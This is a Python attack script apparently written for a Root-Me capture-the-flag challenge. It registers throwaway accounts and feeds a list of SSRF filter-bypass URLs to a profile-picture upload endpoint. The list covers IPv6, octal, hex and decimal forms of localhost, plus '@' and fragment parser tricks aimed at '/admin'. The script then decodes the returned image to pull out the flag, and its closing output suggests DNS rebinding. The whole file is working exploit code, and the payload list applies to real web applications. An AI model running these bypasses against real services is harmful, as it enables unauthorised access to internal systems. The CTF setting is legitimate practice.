#!/usr/bin/env python3
"""
Try various SSRF bypass techniques
"""
import requests
import re
import base64
import uuid
import time

BASE_URL = "https://instance-019c1dbd-d0a8-7399-8a92-e80e035fcedf.challenges.root-me.pro"

def create_session():
    """Create session"""
    try:
        time.sleep(0.5)
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})
        username = f"u_{uuid.uuid4().hex[:8]}"
        password = "pass123"

        r1 = session.post(f"{BASE_URL}/register", data={"username": username, "password": password}, timeout=10)
        if r1.status_code not in [200, 302]:
            return None

        time.sleep(0.3)
        r2 = session.post(f"{BASE_URL}/login", data={"username": username, "password": password}, timeout=10)

        if r2.status_code in [200, 302] and "logout" in r2.text.lower():
            print(f"[+] Session created: {username}")
            return session
    except Exception as e:
        print(f"[!] Session creation error: {e}")
    return None

def check_profile(session):
    """Check profile picture for flag"""
    try:
        r = session.get(f"{BASE_URL}/", timeout=5)
        match = re.search(r'<img src="data:image/png;base64,([^"]+)"', r.text)
        if match:
            b64_content = match.group(1)
            try:
                decoded = base64.b64decode(b64_content).decode('utf-8', errors='ignore')
                flag_match = re.search(r'RM\{[^}]+\}', decoded)
                if flag_match:
                    return ('FLAG', flag_match.group(0))
                if ("flag" in decoded.lower() or "congrats" in decoded.lower() or "admin" in decoded.lower()) and len(decoded) > 200:
                    return ('CONTENT', decoded[:1000])
            except:
                pass
    except:
        pass
    return None

def try_bypass(session, url, description):
    """Try a specific bypass URL"""
    print(f"[*] Testing: {description}")
    print(f"    URL: {url}")
    try:
        r = session.post(f"{BASE_URL}/update-pp", data={"pp-url": url}, timeout=15)
        if r.status_code in [502, 503]:
            print(f"    [!] Server error: {r.status_code}")
            return None

        time.sleep(0.5)
        result = check_profile(session)
        if result:
            return result
        else:
            print(f"    [-] No flag found")
    except Exception as e:
        print(f"    [!] Error: {str(e)[:60]}")
    return None

def main():
    print(f"[*] SSRF Bypass Technique Testing")
    print(f"[*] Target: {BASE_URL}")
    print()

    session = create_session()
    if not session:
        print("[-] Failed to create session")
        return

    # Various bypass techniques
    bypasses = [
        # IPv6 localhost variants
        ("http://[::1]/admin", "IPv6 localhost"),
        ("http://[0:0:0:0:0:0:0:1]/admin", "IPv6 localhost (expanded)"),
        ("http://[::ffff:127.0.0.1]/admin", "IPv6-mapped IPv4 localhost"),

        # Octal/Hex representations
        ("http://0177.0.0.1/admin", "Octal IP (127.0.0.1)"),
        ("http://0x7f.0.0.1/admin", "Hex IP (127.0.0.1)"),
        ("http://2130706433/admin", "Decimal IP (127.0.0.1)"),

        # URL parser confusion
        ("http://localhost/admin", "localhost hostname"),
        ("http://127.0.0.1/admin", "Direct localhost IP"),
        ("http://127.1/admin", "Short localhost"),
        ("http://0.0.0.0/admin", "0.0.0.0"),

        # Try with existing valid domain as base
        ("http://google.com@127.0.0.1/admin", "URL with @ symbol"),
        ("http://127.0.0.1#@google.com/admin", "URL with fragment"),
    ]

    for url, description in bypasses:
        result = try_bypass(session, url, description)

        if result:
            result_type, content = result
            print(f"\n{'='*70}")
            print(f"[!!!] SUCCESS with: {description}")
            print(f"{'='*70}")
            if result_type == 'FLAG':
                print(f"FLAG: {content}")
            else:
                print(f"Content: {content}")
            print(f"{'='*70}")
            return

        time.sleep(0.3)

    print(f"\n[-] All bypass attempts failed")
    print(f"[*] DNS rebinding attack still required")
    print()
    print(f"[!] Recommendation: Set up working DNS rebinding service or")
    print(f"[!] use the root-me VPN connection to access working services")

if __name__ == "__main__":
    main()
